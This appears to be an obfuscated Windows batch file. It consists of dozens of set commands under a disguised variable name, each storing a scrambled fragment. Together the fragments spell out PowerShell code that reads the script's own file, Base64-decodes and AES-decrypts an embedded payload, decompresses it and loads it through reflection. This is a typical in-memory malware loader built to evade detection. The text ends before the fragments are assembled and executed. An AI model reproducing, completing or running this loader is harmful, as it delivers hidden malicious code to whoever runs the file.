@echo off
!wKBrAYVCWPaeXGdarZQH! "obqSmGHvev=mpre"
!wKBrAYVCWPaeXGdarZQH! "orxdBJgHEv=wQK="
!wKBrAYVCWPaeXGdarZQH! "hZoVTAmcWZ=aBmo"
!wKBrAYVCWPaeXGdarZQH! "pwytMyZaxU=omma"
!wKBrAYVCWPaeXGdarZQH! "absrNvxvHi=mpre"
!wKBrAYVCWPaeXGdarZQH! "eYgnuOKSTv=g[]]"
!wKBrAYVCWPaeXGdarZQH! "EmmdKkPQcf=)));"
!wKBrAYVCWPaeXGdarZQH! "yZACUviltH=[-1."
!wKBrAYVCWPaeXGdarZQH! "FkhQkYgxwH=le -"
!wKBrAYVCWPaeXGdarZQH! "nSlzgfEqsx=g[]]"
!wKBrAYVCWPaeXGdarZQH! "CPChDSklkU=tem."
!wKBrAYVCWPaeXGdarZQH! "qhQNDNmdHc=IO.C"
!wKBrAYVCWPaeXGdarZQH! "aXKZQaLziu=var."
!wKBrAYVCWPaeXGdarZQH! "OzmszQhzoy=Conv"
!wKBrAYVCWPaeXGdarZQH! "RJjPVmFbmj=Stre"
!wKBrAYVCWPaeXGdarZQH! "wcmAzVtYoP=ss_f"
!wKBrAYVCWPaeXGdarZQH! "OsQLXavMkX= '')"
!wKBrAYVCWPaeXGdarZQH! "rPdoeWJORd=var."
!wKBrAYVCWPaeXGdarZQH! "tXPcHsKyUo=llAd"
!wKBrAYVCWPaeXGdarZQH! "zDXTKJLOyr=UqZ."
!wKBrAYVCWPaeXGdarZQH! "kbQOFImKUB= ([C"
!wKBrAYVCWPaeXGdarZQH! "HGMmhwIeFW=join"
!wKBrAYVCWPaeXGdarZQH! "whoduPxnRz=))	{"
!wKBrAYVCWPaeXGdarZQH! "HmVKFFTcpE=flec"
!wKBrAYVCWPaeXGdarZQH! "NELhdrtjQM=		$v"
!wKBrAYVCWPaeXGdarZQH! "CKDrvhJksP=m;	$"
!wKBrAYVCWPaeXGdarZQH! "FGMUhuiCpC=(dec"
!wKBrAYVCWPaeXGdarZQH! "myVmhvLtmE=::('"
!wKBrAYVCWPaeXGdarZQH! "GuIBaJpgss=[Sys"
!wKBrAYVCWPaeXGdarZQH! "yOGUnPdWhA=hSYV"
!wKBrAYVCWPaeXGdarZQH! "oEGPoUBpSV=UI.W"
!wKBrAYVCWPaeXGdarZQH! "kxlcrqoTxI=ert]"
!wKBrAYVCWPaeXGdarZQH! "wwIMSmydYb=raph"
!wKBrAYVCWPaeXGdarZQH! "DKKTYqIQmF=);$p"
!wKBrAYVCWPaeXGdarZQH! "goHBtopKCR=C;	$"
!wKBrAYVCWPaeXGdarZQH! "jDmnkdonhN=aeR'"
!wKBrAYVCWPaeXGdarZQH! "rNMgaZXtLV=('da"
!wKBrAYVCWPaeXGdarZQH! "NIfSsogcfY=ddin"
!wKBrAYVCWPaeXGdarZQH! "wLMlPtzcjj=ect "
!wKBrAYVCWPaeXGdarZQH! "gHCvZNlZjv=herM"
!wKBrAYVCWPaeXGdarZQH! "wUxWctNSKH=	$ae"
!wKBrAYVCWPaeXGdarZQH! "RWOedTobsr=yste"
!wKBrAYVCWPaeXGdarZQH! "ufjzZhxeLw=le ="
!wKBrAYVCWPaeXGdarZQH! "nIZkSgJgeC=cute"
!wKBrAYVCWPaeXGdarZQH! "YbMRegDkRc=nd f"
!wKBrAYVCWPaeXGdarZQH! "dOfGruthsy= '')"
!wKBrAYVCWPaeXGdarZQH! "xJyqHEHDXp=Syst"
!wKBrAYVCWPaeXGdarZQH! "kdbHrpcilp=oin "
!wKBrAYVCWPaeXGdarZQH! "rYxFvxLQVh=$pay"
!wKBrAYVCWPaeXGdarZQH! "MbAvbCRNjp=r_va"
!wKBrAYVCWPaeXGdarZQH! "YuFgQglVhO=ar.I"
!wKBrAYVCWPaeXGdarZQH! "cnYshdxXqv=)([b"
!wKBrAYVCWPaeXGdarZQH! "FffHfSTAKl=oL'["
!wKBrAYVCWPaeXGdarZQH! "JHzVqOApel=ryPo"
!wKBrAYVCWPaeXGdarZQH! "luzBitrcHe=m.IO"
!wKBrAYVCWPaeXGdarZQH! "AOznGIrPeF=_fun"
!wKBrAYVCWPaeXGdarZQH! "FdXStPwQJF=('gn"
!wKBrAYVCWPaeXGdarZQH! "vrpMujbIAJ=ctio"
!wKBrAYVCWPaeXGdarZQH! "GwUILnIFKI=('\'"
!wKBrAYVCWPaeXGdarZQH! "VvTQWyoIsW=ram2"
!wKBrAYVCWPaeXGdarZQH! "OHLQTYTIWA= ('%*'"
!wKBrAYVCWPaeXGdarZQH! "GbqreHwjgg=reat"
!wKBrAYVCWPaeXGdarZQH! "EtnplKkFBS=ansf"
!wKBrAYVCWPaeXGdarZQH! "slzbBgwtLA=am(,"
!wKBrAYVCWPaeXGdarZQH! "VRgBFTxRVh=aphy"
!wKBrAYVCWPaeXGdarZQH! "oZOdMRPOWw=_var"
!wKBrAYVCWPaeXGdarZQH! "lXsixegVXv=r.Tr"
!wKBrAYVCWPaeXGdarZQH! "UeOQMwlDPS=::('"
!wKBrAYVCWPaeXGdarZQH! "MYgqYiLROr=ctio"
!wKBrAYVCWPaeXGdarZQH! "yajPAPapIu=ispo"
!wKBrAYVCWPaeXGdarZQH! "erCOproNez=r=[s"
!wKBrAYVCWPaeXGdarZQH! "CrTCsVEYUE=m.Re"
!wKBrAYVCWPaeXGdarZQH! "orEyfBgFVR=vWBO"
!wKBrAYVCWPaeXGdarZQH! "RjMyRosNhR=aram"
!wKBrAYVCWPaeXGdarZQH! "WFfiLYGGTC=	if "
!wKBrAYVCWPaeXGdarZQH! "YaWMwJnreM=aes_"
!wKBrAYVCWPaeXGdarZQH! "abxnayfWDb=kWTm"
!wKBrAYVCWPaeXGdarZQH! "vvHrbavhsJ='%~f0'"
!wKBrAYVCWPaeXGdarZQH! "ZNHpwtwpJg=rn_v"
!wKBrAYVCWPaeXGdarZQH! "RsgmbzgyLt=esaB"
!wKBrAYVCWPaeXGdarZQH! "pVHLsbOcbt=decr"
!wKBrAYVCWPaeXGdarZQH! "teXMklzXAv=s -c"
!wKBrAYVCWPaeXGdarZQH! "jutojxaNhr=r);}"
!wKBrAYVCWPaeXGdarZQH! "SrHLYsNkkq=Bloc"
!wKBrAYVCWPaeXGdarZQH! "gmMsXwoxdt=[Sys"
!wKBrAYVCWPaeXGdarZQH! "zkbtxXPDQn=, 0,"
!wKBrAYVCWPaeXGdarZQH! "NUHWkKrMti=$vYM"
!wKBrAYVCWPaeXGdarZQH! "mLsqkpUOkm=aes_"
!wKBrAYVCWPaeXGdarZQH! "ZYktYdXLWQ=New-"
!wKBrAYVCWPaeXGdarZQH! "CbNmyACOSl=EmL5"
!wKBrAYVCWPaeXGdarZQH! "XzOSIVyrPb=UvKe"
!wKBrAYVCWPaeXGdarZQH! "hImFOyRcQQ=oin "
!wKBrAYVCWPaeXGdarZQH! "YgMClKTWyD='[-1"
